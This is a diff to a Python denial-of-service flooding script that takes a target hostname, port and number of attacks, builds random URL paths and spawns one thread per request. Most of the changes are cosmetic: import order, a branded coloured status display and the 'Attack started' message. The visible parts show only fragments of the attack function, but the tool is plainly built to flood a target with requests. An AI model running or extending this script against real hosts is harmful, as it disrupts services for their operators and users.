@@ -1,15 +1,15 @@
 # -*- coding: utf-8 -*-
 import os
+import fade
 import random
 import socket
 import string
 import sys
 import threading
 import time
-import fade
 
 os.system("clear")
-logo = """
+logo = """         
  ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
  ▒▒▒███████╗▒▒██╗▒▒▒▒▒▒████╗▒▒▒▒██████╗▒██╗▒▒▒███╗▒▒██████╗▒▒████╗▒████████╗▒▒▒
  ▒▒▒██╔═══██╗▒██║▒▒▒▒▒██╔═██╚╗▒██╔════╝▒██║▒▒██╔═╝▒██╔════╝▒██╔═██╚╗▒▒██╔══╝▒▒▒
@@ -39,7 +39,7 @@ elif len(sys.argv) == 4:
     port = int(sys.argv[2])
     num_requests = int(sys.argv[3])
 else:
-    print(f"\n\033[32m Usage: {sys.argv[0]} < Hostname > < Port > < Number_of_Attacks >")
+    print (f"\n Usage: {sys.argv[0]} < Hostname > < Port > < Number-of-attacks >")
     sys.exit(1)
 
 # Convert FQDN to IP
@@ -57,15 +57,19 @@ thread_num_mutex = threading.Lock()
 
 # Print thread status
 def print_status():
-    print("")
     global thread_num
     thread_num_mutex.acquire(True)
+
     thread_num += 1
-    sys.stdout.write(f"\r\033[102m\033[30m{time.ctime().split( )[3]} \033[38;5;57m Get-started\033[0m \033[33" +str(host)+ " \033[32mIp-asdress \033[38;5;206m" +ip+ "\033[0m")
-    sys.stdout.write(f"\r*\033[103m[{str(thread_num)}] \033[37m Get-started\033[0m \033[33m" +str(host)+ " \033[95mIp-address \033[37m" +ip+ "\033[0m")
-    
+    #print the output on the sameline
+    sys.stdout.write(f"\r\033[33m{time.ctime().split( )[3]} [{str(thread_num)}] ")
     sys.stdout.flush()
+    print (f"\033[92m[H\033[33mA\033[32mQ\033[33m-4] \033[32mREQUEST_NUM \033[92m" +str(ip)+ "\033[0m")
+    sys.stdout.write(f"\r\033[95m{time.ctime().split( )[3]}\033[94m [{str(thread_num)}] ")
+    sys.stdout.flush()
+    print (f"\033[33m[H\033[37mA\033[33mQ\033[37m-4] \033[36mREQUEST_NUM \033[35m" +str(ip)+ "\033[0m")
     thread_num_mutex.release()
+
 
 # Generate URL Path
 def generate_url_path():
@@ -98,7 +102,7 @@ def attack():
         dos.close()
 
 
-print (f"[#] Attack started on {host} ({ip} ) || Port: {str(port)} || # Requests: {str(num_requests)}")
+print (f"==⟩⟩ Attack started on {host} ({ip} ) || Port: {str(port)} || # Requests: {str(num_requests)}")
 
 # Spawn a thread per request
 all_threads = []
